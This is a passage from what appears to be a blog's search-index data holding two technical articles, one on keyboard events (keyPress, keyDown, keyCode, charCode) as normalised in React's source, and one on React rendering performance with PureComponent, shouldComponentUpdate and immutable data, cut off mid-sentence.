me.","link":"/2020/06/15/en/react-function-class-hook-useeffect/"},{"title":"Understanding keyPress and keyDown events in React source code","text":"IntroductionRecently, a student asked me a question about the difference between keyPress and keyDown events in React, as well as the difference between keyCode and charCode. Sometimes, they could get the values, but sometimes they couldn’t, and they were confused. At first, I thought React had done some processing, so I looked at the source code. Later, I found that React did indeed do some processing, but in fact, this problem had nothing to do with React. The difference between keyPress and keyDown is a native JavaScript event mechanism. Although this problem has nothing to do with React, it is still a good thing to be able to refer to React’s implementation through an actual problem, and React’s comments are well written. Therefore, this article will first show you the differences between these two events, and finally, we will see how React handles them. Differences between keyPress and keyDownFirst, let’s take a look at the differences between keyPress and keyDown events. We can directly ask MDN to explain this part for us: The keypress event is fired when a key that produces a character value is pressed down. Examples of keys that produce a character value are alphabetic, numeric, and punctuation keys. Examples of keys that don’t produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta. Source: https://developer.mozilla.org/en-US/docs/Web/Events/keypress The keydown event is fired when a key is pressed down. Unlike the keypress event, the keydown event is fired for all keys, regardless of whether they produce a character value. Source: https://developer.mozilla.org/en-US/docs/Web/Events/keydown In short, keyDown is triggered when you press any key, but keyPress is only triggered when the key you press can produce a character. In other words, you are typing when you press this key. For example, when you press a, a character a will appear on the screen, so both keyDown and keyPress will be triggered. But if you press shift, nothing will appear on the screen, so only keyDown will be triggered. W3C provides a very good webpage: Key and Character Codes vs. Event Types, which allows you to experiment for yourself. In the figure below, I enter a, and both events will be triggered. Then I press shift, only keyDown will be triggered, and then I press backspace to delete the text, only keyDown will be triggered: So I believe you should be very clear about the differences between these two events. keyDown can be regarded as “pressing a key”, and keyPress can be regarded as an event triggered when “entering something”. Next, let’s talk about the differences between keyCode and charCode. Differences between keyCode and charCodeLet’s talk about charCode first. Maybe you have seen a function in JavaScript like this: console.log(String.fromCharCode(65)) // A charCode is actually a number representing a character, or more precisely, its Unicode encoding. If you are not familiar with this, you can refer to this article: [Guide] Understanding the encoding that cannot be understood in web pages: the use of Unicode in JavaScript. In JavaScript, you can also use another function to get the encoding of a character: console.log(&#39;嗨&#39;.charCodeAt(0)) &#x2F;&#x2F; 21992 If you convert 21992 to hexadecimal, it becomes 0x55E8, which is the Unicode for “嗨”: (Source: https://www.cns11643.gov.tw/wordView.jsp?ID=90944) So what is keyCode? Since charCode represents the code of a character, keyCode obviously represents the code of a key. Each “key” also has its own code, and sometimes it can be confusing because it may be the same as charCode. For example: the keyCode of the “A” key is 65, and the charCode of the “A” character is also 65. This is probably designed for some convenience, but you should note that: When I press the “A” key, I may want to type “a” or “A”, there are two possibilities. Or take another example, when you want to type the number 1, if you use the key above Q instead of the numeric keypad, the character you want to type may be “1” or “!” or even “ㄅ”, because they are all on the same key. One key corresponds to more than one character, so you cannot determine what the user wants to type from keyCode alone. Now that we’ve talked about the relationship between keyPress and keyDown, let’s think about these two and their relationship with keyCode and charCode. As mentioned earlier, keyPress is triggered when you want to enter text, so this event will get charCode because you need to know what the user typed. Why not keyCode? Because you don’t know what he typed from keyCode, so it’s useless to get keyCode. keyDown is triggered when you press any key, and you must get keyCode at this time because you need to know what key the user pressed. If you get charCode, you won’t get a value when you press shift or ctrl, because this is not a character, so you won’t know what the user pressed. In summary, when you want to detect user input, use keyPress and use charCode to see what the user just typed; when you want to detect the user pressing a key, use keyDown and use keyCode to get the key the user pressed. This is the difference between keyPress, keyDown, keyCode, and charCode. By the way, when inputting Chinese, keyPress will not have a value, and keyDown will return a mysterious code 229: key and whichIn the keyPress and keyDown events, there are actually two more properties: key and which. Let’s first look at what which is: The which read-only property of the KeyboardEvent interface returns the numeric keyCode of the key pressed, or the character code (charCode) for an alphanumeric key pressed. Source: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which In my understanding, when you use which in keyPress, you should get charCode; when you use it in keyDown, it should be keyCode. Therefore, when writing code, you can use event.which to get this information without distinguishing between keyCode or charCode. However, the reference materials attached to MDN are quite vague, so I am not sure about this part: which holds a system- and implementation-dependent numerical code signifying the unmodified identifier associated with the key pressed. In most cases, the value is identical to keyCode. Source: https://www.w3.org/TR/2014/WD-DOM-Level-3-Events-20140925/#widl-KeyboardEvent-which Let’s take a look at the key property: The KeyboardEvent.key read-only property returns the value of the key pressed by the user while taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale&#x2F;layou Source: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key In short, key will be a string representing the key or character that was pressed. For example, if you type “A”, key will be “A”. If you press the Shift key, key will be “Shift”. It’s important to note that this property can be accessed in both the keyPress and keyDown events. So even in a keyDown event, you can still know what key or character the user just typed. However, when it comes to detecting user input, the keyPress event is the most appropriate, unless you want to detect other non-character keys (such as Ctrl, Delete, Shift, etc.) in which case you would use the keyDown event. To summarize, the which, keyCode, and charCode properties may behave differently across different browsers, making cross-browser support a challenging aspect. However, as older browsers are gradually being phased out, most users are likely using browsers that are more standards-compliant, so compatibility is not the focus of this article. Now let’s move on to the most exciting part: the React source code. Exploring the React Source CodeThe React source code is so large, where do we even begin? Here’s a super useful method: GitHub search. Usually, if you search for the function name or related keywords, you can narrow down the scope and find the corresponding source code with just a little bit of manual searching. It’s a convenient and useful method. Let’s use keyPress as our keyword and see what we get. We get 12 results: After a quick glance, we can see that many of them are tests, which we can skip. You should be able to quickly locate a few relevant files, such as these two: packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;SyntheticKeyboardEvent.js packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;getEventKey.js Yes, these two are our main focus today. Let’s start with SyntheticKeyboardEvent.js. If you’re familiar with React, you should know that the events you get inside it are not native events, but rather events that have been wrapped by React. This SyntheticKeyboardEvent is the event that has been wrapped by React, and it’s what you get when you use onKeyPress or onKeyDown. For convenience, let’s break it down into several functions and take a closer look. charCode: function(event) &#123; // `charCode` is the result of a KeyPress event and represents the value of // the actual printable character. // KeyPress is deprecated, but its replacement is not yet final and not // implemented in any major browser. Only KeyPress has charCode. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; return 0; &#125; The comments here are great. It mentions that keyPress has been deprecated, but the replacement is not ready yet. It also mentions that only keyPress has charCode. So this function checks if the event type is keyPress. If it is, it returns getEventCharCode(event), otherwise it returns 0. Now let’s take a look at what getEventCharCode does (note that this function is in another file): /** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */ function getEventCharCode(nativeEvent) &#123; let charCode; const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125; &#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode; &#125; // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux) // report Enter as charCode 10 when ctrl is pressed. if (charCode === 10) &#123; charCode = 13; &#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them. // Must not discard the (non-)printable Enter-key. if (charCode >= 32 || charCode === 13) &#123; return charCode; &#125; return 0; &#125; Let’s break it down into sections for easier understanding: /** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */ The comment at the beginning tells you that charCode represents the character code, so you can use String.fromCharCode to find the corresponding character. Therefore, only characters that can be printed (or displayed) have charCode, and Enter is an exception because Enter produces a blank line. But Tab is not, because pressing Tab does not produce a character representing Tab. let charCode; const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125; &#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode; &#125; Here, processing is done for browser compatibility. FireFox does not set charCode for Enter, so you need to check if the keyCode is 13. And IE8 does not implement charCode, so the value of keyCode is used instead. // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux) // report Enter as charCode 10 when ctrl is pressed. if (charCode === 10) &#123; charCode = 13; &#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them. // Must not discard the (non-)printable Enter-key. if (charCode >= 32 || charCode === 13) &#123; return charCode; &#125; This is a special case where the charCode is 10 when the user presses Ctrl + Enter, and React wants to treat this as pressing Enter. Also, some characters that cannot be printed should be removed, so a range check is performed at the end. That’s how charCode is handled. It’s actually quite interesting when you look closely, as it checks for special cases and browser compatibility. Now let’s go back to SyntheticKeyboardEvent.js to see how keyCode is handled: keyCode: function(event) &#123; // `keyCode` is the result of a KeyDown/Up event and represents the value of // physical keyboard key. // The actual meaning of the value depends on the users' keyboard layout // which cannot be detected. Assuming that it is a US keyboard layout // provides a surprisingly accurate mapping for US and European users. // Due to this, it is left to the user to implement at this time. if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0; &#125; Here, it is said that the value of keyCode actually depends on the keyboard, meaning that some keyboards may produce different keyCodes. However, since most users in the US and Europe use a US keyboard, keyCode is simply returned without special handling. Actually, I didn’t fully understand this part, I just guessed the meaning roughly. The “keyboard layout” referred to here may be a layout like QWERTY or Dvorak, where the arrangement of keys is completely different. But if this results in different keyCodes, does that mean that some websites may have bugs? However, most people have the same keyboard layout, so this issue doesn’t seem to be a big concern. which: function(event) &#123; // `which` is an alias for either `keyCode` or `charCode` depending on the // type of the event. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0; &#125; Finally, for which, if it is keypress, charCode is returned, and if it is keydown or keyup, keyCode is returned. So far, we have seen how React handles charCode, keyCode, and which. charCode checks for special cases and browser compatibility, keyCode is simply returned, and which returns the corresponding value depending on the event. Finally, let’s take a look at how key is handled, which is in another file called getEventKey.js: /** * Normalization of deprecated HTML5 `key` values * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */ const normalizeKey = &#123; Esc: 'Escape', Spacebar: ' ', Left: 'ArrowLeft', Up: 'ArrowUp', Right: 'ArrowRight', Down: 'ArrowDown', Del: 'Delete', Win: 'OS', Menu: 'ContextMenu', Apps: 'ContextMenu', Scroll: 'ScrollLock', MozPrintableKey: 'Unidentified', &#125;; /** * Translation from legacy `keyCode` to HTML5 `key` * Only special keys supported, all others depend on keyboard layout or browser * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */ const translateToKey = &#123; '8': 'Backspace', '9': 'Tab', '12': 'Clear', '13': 'Enter', '16': 'Shift', '17': 'Control', '18': 'Alt', '19': 'Pause', '20': 'CapsLock', '27': 'Escape', '32': ' ', '33': 'PageUp', '34': 'PageDown', '35': 'End', '36': 'Home', '37': 'ArrowLeft', '38': 'ArrowUp', '39': 'ArrowRight', '40': 'ArrowDown', '45': 'Insert', '46': 'Delete', '112': 'F1', '113': 'F2', '114': 'F3', '115': 'F4', '116': 'F5', '117': 'F6', '118': 'F7', '119': 'F8', '120': 'F9', '121': 'F10', '122': 'F11', '123': 'F12', '144': 'NumLock', '145': 'ScrollLock', '224': 'Meta', &#125;; /** * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;string&#125; Normalized `key` property. */ function getEventKey(nativeEvent: KeyboardEvent): string &#123; if (nativeEvent.key) &#123; // Normalize inconsistent values reported by browsers due to // implementations of a working draft specification. // FireFox implements `key` but returns `MozPrintableKey` for all // printable characters (normalized to `Unidentified`), ignore it. const key = normalizeKey[nativeEvent.key] || nativeEvent.key; if (key !== 'Unidentified') &#123; return key; &#125; &#125; // Browser does not implement `key`, polyfill as much of it as we can. if (nativeEvent.type === 'keypress') &#123; const charCode = getEventCharCode(nativeEvent); // The enter-key is technically both printable and non-printable and can // thus be captured by `keypress`, no other non-printable key should. return charCode === 13 ? 'Enter' : String.fromCharCode(charCode); &#125; if (nativeEvent.type === 'keydown' || nativeEvent.type === 'keyup') &#123; // While user keyboard layout determines the actual meaning of each // `keyCode` value, almost all function keys have a universal value. return translateToKey[nativeEvent.keyCode] || 'Unidentified'; &#125; return ''; &#125; Here, processing is also done for browser compatibility. If the event already has a key, it is first normalized to return the result in a consistent format. FireFox sets all printable characters to MozPrintableKey, which is normalized to Unidentified. If the normalized key is not Unidentified, it is returned, otherwise further processing is done. This further processing refers to polyfilling. If there is no key available, processing is done based on charCode or keyCode to return the corresponding character or key name. That’s about it for how React handles these keyboard-related events. The code comments are well written and provide a lot of relevant information. The code is short and not complicated, and it looks easy to read, making it a good entry point for beginners. ConclusionI’ve used these keyboard-related events so many times before, but I’ve never thought about their differences. Either I just wrote something and it caused a bug, or I just copied the best answer from Stack Overflow without really understanding the differences. This time, I happened to delve into it because I wanted to help someone, and I didn’t expect that a simple keyboard event would be so deep. You may need to step on a few mines to really appreciate it. The most troublesome thing is actually browser compatibility, as each browser may have its own implementation, and how to handle these different situations is the tricky part. When it comes to React source code, what most people think of is the rendering mechanism or component handling, which is very complex and requires a certain understanding of the overall architecture to understand. This article chose to start with keyboard events to see how React handles them. I believe everyone can understand the code and it doesn’t seem particularly difficult. I just want to tell you that if you want to study other people’s source code, you don’t necessarily have to understand the whole project, you can start with some small parts. You can learn a lot from it.","link":"/2019/03/24/en/react-keypress-keydown/"},{"title":"React Performance Optimization Challenge: Understanding Immutable Data and shouldComponentUpdate","text":"Recently, while refactoring a project at my company, I tried some things and found that I didn’t really understand React’s rendering mechanism and when render would be triggered. Later, I found that not only me, but many people were not familiar with the whole mechanism, so I decided to write this article to share my experience. Actually, it’s not too bad if you don’t know how to optimize, but the worse thing is that you think you’re optimizing, but you’re actually slowing down performance, and the root cause is that you’re not familiar enough with the whole mechanism of React. The “optimized” component is slower! This is serious. Therefore, this article will cover the following topics: The difference between Component and PureComponent The role of shouldComponentUpdate React’s rendering mechanism Why use Immutable data structures To determine how much you understand the above, let’s take a few quizzes right away! Some of them have traps, so please keep your eyes open! React QuizQuestion 1The following code is a very simple web page with just a button and a component called Content. When the button is clicked, it changes the state of the App component. class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; ReactDOM.render( &lt;App />, document.getElementById('container') ); Question: What will be output to the console when you click the button? A. Nothing (neither the render function of App nor the render function of Content is executed)B. Only render App! (only the render function of App is executed)C. render App! and render content! (both render functions are executed) Question 2The following code is also very simple, divided into three components: App, Table, and Row. App passes list to Table, and Table uses map to render each Row. class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends Component &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) => (&#123;id: index&#125;)) &#125; handleClick = () => &#123; this.setState(&#123; otherState: 1 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>change state!&lt;/button> &lt;Table list=&#123;list&#125; /> &lt;/div> ); &#125; &#125; The problem with this code is that when the button is clicked, the render function of App is triggered, and then the render function of Table is also triggered, so the entire list is re-rendered. However, when we click the button, list hasn’t changed at all, so it doesn’t need to be re-rendered. So clever Xiao Ming changed Table from a Component to a PureComponent, which won’t re-render as long as state and props haven’t changed, like this: class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; // 不知道什麼是 PureComponent 的朋友，可以想成他自己幫你加了下面的 function shouldComponentUpdate (nextProps, nextState) &#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState) &#125; After changing Table from a Component to a PureComponent, will efficiency be improved if we do the same operation again, that is, click the change state button to change the state of App? A. Yes, in this case, PureComponent is more efficient than ComponentB. No, both are about the sameC. No, in this case, Component is more efficient than PureComponent Question 3Next, let’s look at an example that is very similar to the previous one, except that this time the list changes when the button is pressed: class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) => (&#123;id: index&#125;)) &#125; handleClick = () => &#123; this.setState(&#123; list: [...this.state.list, 1234567] // 增加一個元素 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>change state!&lt;/button> &lt;Table list=&#123;list&#125; /> &lt;/div> ); &#125; &#125; At this point, the PureComponent optimization of Table is no longer useful because list has changed, so the render function will be triggered. To continue optimizing, a more common approach is to change Row to a PureComponent, which ensures that the same Row will not be rendered again. class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; Question: After changing Row from a Component to a PureComponent, if we do the same operation again, that is, click the change state button to change the list, will efficiency be improved? A. Yes, in this case, PureComponent is more efficient than ComponentB. No, both are about the sameC. No, in this case, Component is more efficient than PureComponent React’s Rendering MechanismBefore revealing the answers, let’s briefly review how React renders your screen. First of all, everyone knows that you can return what you want to render in the render function, for example: class Content extends React.Component &#123; render () &#123; return &lt;div>Content&lt;/div> &#125; &#125; It should be noted that what is returned here will not be directly placed on the DOM, but will first go through a layer of virtual DOM. In fact, you can simply think of this virtual DOM as a JavaScript object. For example, the result rendered by the Content above may be: &#123; tagName: 'div', children: 'Content' &#125; The last step is for React to perform virtual DOM diff, compare the last and current virtual DOM, and update the changed parts to the real DOM. In short, a layer of virtual DOM is added between the React Component and the DOM, the things you want to render are first converted into virtual DOM, and then the things that need to be updated are updated to the real DOM. In this way, the number of times the real DOM is touched can be reduced and performance can be improved. For example, suppose we implement a very simple example that changes the state after clicking a button: class Content extends React.Component &#123; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () => &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content text=&#123;this.state.text&#125; /> &lt;/div> ); &#125; &#125; At the beginning of the program execution, the rendering order is as follows: Call the render of App Call the render of Content Get the virtual DOM Compare with the last virtual DOM Apply the changes to the real DOM At this time, the overall virtual DOM should look like this: &#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'hello' &#125; ] &#125; When you click the button and change the state, the execution order is the same as before: Call the render of App Call the render of Content Get the virtual DOM At this time, the obtained virtual DOM should look like this: &#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'world' // 只有這邊變了 &#125; ] &#125; The virtual DOM diff algorithm of React will find that only one place has changed, and then replace the text there, and other parts will not be affected. In fact, the official document explains this part very well: When you use React, at a single point in time you can think of the render() function as creating a tree of React elements. On the next state or props update, that render() function will return a different tree of React elements. React then needs to figure out how to efficiently update the UI to match the most recent tree. In summary, you can think of the render function as creating a tree of React elements, and then React compares this tree with the last one to find out how to efficiently update the UI to match the most recent tree. Therefore, to successfully update the UI, you must go through two steps: render function virtual DOM diff Therefore, if you want to optimize performance, you have two directions: Do not trigger the render function Keep the virtual DOM consistent Let’s start with the latter! Improving React Performance: Keeping the Virtual DOM ConsistentBecause of the protection of the virtual DOM, you usually don’t have to worry too much about React’s performance. For example, the first question in the Q&amp;A at the beginning: class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; ReactDOM.render( &lt;App />, document.getElementById('container') ); Every time you click the button, because the state of App has changed, the render function of App will be triggered first, and because it returns &lt;Content /&gt;, the render function of Content will also be triggered. So every time you click the button, the render function of these two components will be called once. Therefore, the answer is C. render App! and render content! (Both render functions are executed) However, even so, the real DOM will not change. Because during the virtual DOM diff, React will find that the current and last virtual DOM are exactly the same (because nothing has changed), so it will not make any changes to the DOM. If you can maintain the similarity of the structure of the virtual DOM as much as possible, you can reduce some unnecessary operations. There are still many optimizations that can be done in this regard, which can be referred to in the official document, which is written in detail. Boosting React Performance: Avoid Triggering Render FunctionAlthough we don’t need to worry too much, the virtual DOM diff also takes execution time. Although it’s fast, it’s still not as fast as not calling it at all, right? For situations where “we already know there should be no changes,” we shouldn’t even call the render function because it’s unnecessary. If the render function isn’t called, the virtual DOM diff doesn’t need to be executed, which improves performance. You may have heard of the shouldComponentUpdate function, which is used for this purpose. If you return false in this function, the render function won’t be called again. class Content extends React.Component &#123; shouldComponentUpdate () &#123; return false; &#125; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; After adding it, you’ll notice that the Content render function won’t be triggered no matter how many times you press the button. But be careful when using this, as you may encounter situations where the state and UI don’t match if you’re not careful. For example, the state may have changed to “world,” but the UI still displays “Hello”: class Content extends React.Component &#123; shouldComponentUpdate()&#123; return false; &#125; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () => &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content text=&#123;this.state.text&#125; /> &lt;/div> ); &#125; &#125; In the example above, the state did change to “world” after pressing the button, but because the shouldComponentUpdate of Content always returns false, the render won’t be triggered again, and you won’t see the corresponding new state on the screen. However, this is a bit extreme because usually, you won’t always return false unless you’re sure that this component doesn’t need to re-render at all. Instead, there’s a more reasonable criterion: If none of the props and state have changed, return false. class Content extends React.Component &#123; shouldComponentUpdate(nextProps, nextState)&#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState); &#125; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; Suppose this.props is: &#123; text: 'hello' &#125; And nextProps is: &#123; text: 'world' &#125; When comparing them, you’ll notice that props.text has changed, so it’s natural to call the render function again. Also, shallowEqual is used here to compare the differences between the previous and current states, not deepEqual. This is due to performance considerations. Don’t forget that comparing like this also consumes resources, especially when your object is very deep, and there are many things to compare. Therefore, we tend to use shallowEqual to compare only one layer. Also, as mentioned earlier, there’s PureComponent, which is another type of component provided by React. The difference is that it automatically adds the comparison mentioned above. If you want to see the source code, it’s here: if (type.prototype &amp;&amp; type.prototype.isPureReactComponent) &#123; return ( !shallowEqual(oldProps, newProps) || !shallowEqual(oldState, newState) ); &#125; Now, let’s reveal the answer to the second question. The answer is: A. Yes, in this case, PureComponent is more efficient than Component because after inheriting PureComponent, if the props and state haven’t changed, the render function won’t be executed, and the virtual DOM diff won’t be executed, saving a lot of overhead. shallowEqual and Immutable Data StructuresWhen you first start learning React, you may be told that you can’t modify data like this: // 不能這樣 const newObject = this.state.obj newObject.id = 2; this.setState(&#123; obj: newObject &#125;) // 也不能這樣 const arr = this.state.arr; arr.push(123); this.setState(&#123; list: arr &#125;) Instead, you should do it like this: this.setState(&#123; obj: &#123; ...this.state.obj, id: 2 &#125; &#125;) this.setState(&#123; list: [...this.state.arr, 123] &#125;) Do you know why? This is related to what we talked about earlier. As mentioned above, using PureComponent is normal because if the state and props haven’t changed, the render function shouldn’t be triggered. And as mentioned earlier, PureComponent helps you shallowEqual the state and props to determine whether to call the render function. In this case, if you use the first method mentioned above, you’ll encounter problems, such as: const newObject = this.state.obj newObject.id = 2; this.setState(&#123; obj: newObject &#125;) In the code above, this.state.obj and newObject actually point to the same object, the same memory block. So when we’re doing shallowEqual, we’ll judge that these two things are equal, and the render function won’t be executed. At this point, we need Immutable data, which means “once a data is created, it will never change”. So, if you need to modify the data, you can only create a new one. const obj = &#123; id: 1, text: 'hello' &#125; obj.text = 'world' // 這樣不行，因為你改變了 obj 這個物件 // 你必須要像這樣創造一個新的物件 const newObj = &#123; ...obj, text: 'world' &#125; With the concept of Immutable, shallowEqual won’t fail because if we have new data, we can ensure that it is a new object. This is why we always generate a new object when using setState, instead of directly manipulating the existing one. // 沒有 Immutable 的概念前 const props = &#123; id: 1, list: [1, 2, 3] &#125; const list = props.list; list.push(4) nextProps = &#123; ...props, list &#125; props.list === nextProps.list // true // 有了 Immutable 的概念後 const props = &#123; id: 1, list: [1, 2, 3] &#125; const nextProps = &#123; ...props, list: [...props.list, 4] &#125; props.list === nextProps.list // false One thing to note here is that the spread operator only copies the first layer of data, it is not a deep clone: const test = &#123; a: 1, nest: &#123; title: 'hello' &#125; &#125; const copy = &#123;...test&#125; copy.nest === test.nest // true So when your state has a more complex structure, changing the data will become more complicated because you have to do similar things for each layer to avoid directly modifying the object you want to change: // 沒有 Immutable 的概念前 const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ] &#125; const list = props.list; list[1].name = 'world2'; // 直接改 nextProps = &#123; ...props, list &#125; props.list === nextProps.list // true props.list[1] === nextProps.list[1] // true // 有了 Immutable 的概念後 const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ] &#125; // 要注意這邊只是 shallow copy 而已 // list[0] === props.list[0] => true const list = [...props.list.slice(0, 1)] const data = props.list[1]; const nextProps = &#123; ...props, list: [...list, &#123; ...data, // 再做一次 spread oprator name: 'world2' &#125;] &#125; props.list === nextProps.list // false props.list[0] === nextProps.list[0] // true props.list[1] === nextProps.list[1] // false If your state structure has many layers, it will become very difficult to change. In this case, you have three options: Avoid having too many layers of state, try to flatten it (refer to normalizr) Find a library that will help you with Immutable, such as Facebook’s Immutable.js Just use deep clone to copy all the data, and then change it however you want (not recommended) Note: Thanks to KanYueh Chen for pointing out the above paragraph. Pitfalls of PureComponentAfter following the rules of Immutable, we naturally want to set all Components as PureComponent because the default of PureComponent is reasonable. If the data hasn’t changed, the render function won’t be called, which can save a lot of unnecessary comparisons. Let’s go back to the last question of the quiz: class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; We changed Row to PureComponent, so it won’t re-render as long as the state and props haven’t changed. So the answer should be “A. Yes, in this case, PureComponent is more efficient than Component”? Wrong. If you look at the code more carefully, you will find that the answer is actually “C. No, in this case, Component is more efficient than PureComponent”. Your premise is correct, “if the state and props haven’t changed, PureComponent is more efficient than Component”. But there is another sentence that is also correct: “If your state or props ‘will always change’, then PureComponent won’t be faster”. So the difference in using these two lies in whether the state and props will change frequently or not. In the example above, the trap is in the itemStyle props. We create a new object every time we render, so for Row, even though props.item is the same, props.style is “always different”. If you already know that the props comparison will fail every time, then PureComponent is useless and even worse. Why? Because it does shallowEqual. Don’t forget that shallowEqual also takes time to execute. If you already expect that the props or state of a certain component will “change frequently”, then you don’t need to switch to PureComponent because your implementation will become slower. To sum up, when studying performance-related issues, I highly recommend this article: React, Inline Functions, and Performance, which has solved many of my doubts and brought me many new ideas. For example, the article mentioned at the end that sometimes PureComponent can actually slow down, which I also learned from this article. I highly recommend everyone to take the time to read it. Recently, I worked with my colleagues to rebuild a project, and the original consensus was to use PureComponent as much as possible. However, 